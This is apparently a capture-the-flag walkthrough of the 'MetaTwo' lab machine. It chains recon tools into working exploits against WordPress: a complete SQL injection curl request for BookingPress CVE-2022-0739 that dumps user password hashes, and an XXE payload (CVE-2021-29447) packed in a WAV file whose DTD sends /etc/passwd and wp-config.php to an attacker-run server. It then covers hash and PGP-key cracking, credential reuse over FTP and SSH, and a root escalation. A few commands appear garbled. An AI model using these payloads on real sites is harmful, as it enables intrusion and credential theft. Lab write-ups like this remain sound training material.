![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/636012f7eac0b2f08c89cff8_MetaTwo.webp)
## Nmap

Nmap shows only 3 open ports:
21/tcp FTP
22/tcp SSH
80/tcp HTTP

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/636014f4a4513b509d36a55b_nmap.webp)

## Gobuster

/wp-admin
/wp-content
/wp-includes
/xmlrpc.php

## WP-Scan

We are dealing with a WordPress blog.
Let's scan it with WPScan, starting with:

```sh
wpscan --url http://metapress.htb --enumerate u
```

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/636017e15544726485e8c6bb_wpsca.webp)![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/63601989313efc2775186b2d_wpscan_users.webp)

From the homepage, **click on the blog link** to be redirected to the
**/events/** page.

In the Network section of the developer tools, we discover the name of the
plugin used:
**bookingpress ver=1.0.10**

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/63601b7a663cb07213501a01_wpscan_plugins_booking_version.webp)

## CVE-2022-0739

After a brief Google search for the **BookingPress** plugin, we find this
link:
[wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357  
](https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357)
**BookingPress < 1.0.11: Unauthenticated SQL Injection**

Following the website's guidelines for vulnerability explanation, we go to
/events/ and look for the value "**wp_nonce**" in the developer tools.

To obtain the necessary information (user and password for the login page), we
need to modify the string suggested by wpscan.com slightly to exploit the
vulnerability.

- We can follow this guide on SQL UNION INJECTION:
https://medium.com/@nyomanpradipta120/sql-injection-union-attack-9c10de1a5635

This will give us the following command:

```sh
curl -i 'http://metapress.htb/wp-admin/admin-ajax.php' --data
'action=bookingpress_front_get_category_services&_wpnonce=33ad3b4921&category_id=33&total_service=-7502)
UNION ALL SELECT
group_concat(user_login),group_concat(user_pass),@@version_compile_os,1,2,3,4,5,6
from wp_users-- -'
```

This command will result in:
```json
[{"bookingpress_service_id":"admin,manager","bookingpress_category_id":"$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.,$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70","bookingpress_service_name":"debian-
linux-
gnu","bookingpress_service_price":"$1.00","bookingpress_service_duration_val":"2","bookingpress_service_duration_unit":"3","bookingpress_service_description":"4","bookingpress_service_position":"5","bookingpress_servicedate_created":"6","service_price_without_currency":1,"img_url":"http:\/\/metapress.htb\/wp-
content\/plugins\/bookingpress-appointment-booking\/images\/placeholder-
img.jpg"}]
```

This will yield two hashes:

```
$P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV.
$P$B4aNM28N0E.tMy\/JIcnVMZbGcU16Q70
```

`$P$ `is a type of MD5 Hash used by WordPress, and we can crack it with **hashcat**:
```sh
hashcat -m 400 -a 0 $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70
/usr/share/wordlists/rockyou.txt$P$B4aNM28N0E.tMy
```

**Login nella WP** dashboard con le credenziali: manager:p###############r

In the home directory, we find an interesting folder, ".passpie," and inside
".passpie," a file, ".keys."

### XXE CVE-2021-29447

After logging in, you will find a **basic Dashboard** with the ability to **upload files**.

We can't upload the typical PHP reverse shell file to gain a foothold because the system doesn't accept this file type.
Renaming it or changing header request parameters in Burp Suite doesn't work either.

We know that this blog is using WordPress version 5.6 (you can verify this information using WPScan or Wappalyzer). We found on Google that **this version is vulnerable to the XXE CVE-2021-29447**.

Below are some useful links for the exploit and to understand how this vulnerability works:

- [https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5](https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5)
- [https://github.com/AssassinUKG/CVE-2021-29447](https://github.com/AssassinUKG/CVE-2021-29447)
- [https://github.com/motikan2010/CVE-2021-29447](https://github.com/motikan2010/CVE-2021-29447)
- [https://www.youtube.com/watch?v=tE8Smz1Jvb8](https://www.youtube.com/watch?v=tE8Smz1Jvb8)

#### Step 1:

Let's create a .wave file with an iXML payload injected:

```sh
echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00<?xml version="1.0"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM '"'"'http://$IP:$PORT/evil.dtd'"'"'>%remote;%init;%trick;]>\x00' > payload.wav
```

#### Step 2:

Now, create a file named "poc.dtd." This file will be called by the payload you upload to WordPress.

```bash
vim poc.dtd <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"> <!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://$IP:$PORT/?p=%file;'>"
```
#### Step 3:

Now, you need to run a PHP server that will listen. Use the port chosen in the previous payload.

```sh
php -S 0.0.0.0:$PORT
```
#### Step 4:

Proceed with the upload of the "payload.wav" file to WordPress.

Once the upload is complete, your listening server will respond with base64-encoded strings from the file you requested to read in the payload (in this example, /etc/passwd). Decode the string as follows:

```sh
echo -en {base64_string} | base64 -d
```

![Base64 Encoded Password](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360ae4a0d267a68e0cf7562_base64_encoded_passwd.webp)

We immediately notice that in the `/etc/passwd` file, there is a username:

jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash

Now, let's attempt to gather more information about the database by referencing the `/wp-config.php` file. To do this, we'll modify the "poc.dtd" file as follows:

```xml
<!ENTITY % file SYSTEM
"php://filter/zlib.deflate/read=convert.base64-encode/resource=../wp-config.php">  
<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM
'http://10.10.14.26:8081/?p=%file;'>" >
```

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360b02d3abe6310306ef9f0_wp-config.webp)

Perfect. We've managed to obtain the information we were looking for. We now have two sets of credentials, one for the MySQL database and one for FTP.

We've already seen that the FTP port 21 is open, but not for anonymous connections. Now that we have the username and password, let's connect!

### FTP

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360b1e73abe6322116f1212_ftp_connect.webp)

Within the FTP, we find two directories: **blog** and **mailer**. Let's search for any hidden credentials to access SSH.

In the **mailer** directory, let's download and open the file "**send_email.php**" where we'll find **user and password** for our friend "jnelson".

### SSH

Finally, we can connect via SSH using the recently found credentials. Once connected, we can immediately retrieve the **user.txt** file.

Now, we need to figure out how to elevate our privileges to root.

Within the home directory, we find an interesting folder called "**.passpie**." Inside **/.passpie/**, there is a file called "**.keys**."

![](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360b4f8adbd3b439a7b40cf_passpie.webp)

Passpie, as described on its [official website](https://passpie.readthedocs.io/en/latest/), is a command-line tool for managing passwords from the terminal.

Inside the **.keys** file, you'll discover two **PGP (Pretty Good Privacy) keys**: a Public key and a Private key.

### GPG2JOHN

We will use **John the Ripper** to crack the PGP key. However, before we proceed, we need to convert the PGP key into a format that John can crack:

```sh
gpg2john pgp.key > key.hash
```

Now, let's crack the hash using "John":
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt 01.hash
```

![Cracking the Key](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360b996d311531cf01248bb_crack_key.webp)

Return to the **victim machine**, execute these commands, and we'll achieve root access:
```sh
passpie copy ssh --to stdout $ su
```

![Root Access](https://uploads-ssl.webflow.com/6360098c80eb70db541a2560/6360ba1d82ec266aa7cc499a_root.webp)